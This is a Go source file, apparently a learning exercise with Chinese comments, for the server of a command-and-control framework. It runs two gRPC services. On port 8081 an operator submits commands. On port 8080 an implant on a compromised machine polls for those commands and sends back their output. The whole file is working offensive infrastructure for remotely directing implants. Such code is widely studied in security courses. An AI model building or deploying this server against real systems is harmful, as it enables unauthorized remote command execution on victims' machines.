package main

import (
	"c2/implant/grpcapi"
	"context"
	"errors"
	"fmt"
	"net"

	"google.golang.org/grpc"
)

// 需要实现Implant和admin两个服务
// 接收来自客户端的命令和来自植入程序的轮询

type ImplantServer struct {
	work, output                       chan *grpcapi.Command
	grpcapi.UnimplementedImplantServer // 实现grpcapi.ImplantServer接口
}

type AdminServer struct {
	work, output chan *grpcapi.Command
	grpcapi.UnimplementedAdminServer
}

//
func NewImplantServer(work, output chan *grpcapi.Command) *ImplantServer {
	s := new(ImplantServer)
	s.work = work
	s.output = output
	return s
}

func NewAdminServer(work, output chan *grpcapi.Command) *AdminServer {
	s := new(AdminServer)
	s.work = work
	s.output = output
	return s
}

// 客户端会轮询查看是否有命令
func (s *ImplantServer) Fetchcommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	select { // 非阻塞
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("管道关闭")
	default:
		return cmd, nil
	}
}

//Fetchcommand(context.Context, *Empty) (*Command, error)
//SendOutput(context.Context, *Command) (*Empty, error)

// 将获取到的结果放到管道
func (s *ImplantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

// 管理组件想要植入程序执行的命令
func (s *AdminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() { // 异步执行命令
		s.work <- cmd
	}()
	res = <-s.output // 阻塞等待结果
	return res, nil
}

func main() {
	var (
		implantListener, adminListener net.Listener
		//err                            error
		opts         []grpc.ServerOption
		work, output chan *grpcapi.Command
	)

	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)

	// 使用一个管道，实现管理程序和客户端的通信
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output)

	implantListener, _ = net.Listen("tcp", ":8080")
	adminListener, _ = net.Listen("tcp", ":8081")

	// 创建服务实例
	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)

	// 判断是否实现了接口
	// var a interface{} = implant
	// fmt.Println(a.(grpcapi.ImplantServer))
	fmt.Println(implantListener, adminListener, opts)
	// // 注册服务
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)

	go func() {
		// 启动服务端
		grpcImplantServer.Serve(implantListener)
	}()
	// 启动管理服务
	grpcAdminServer.Serve(adminListener)

}
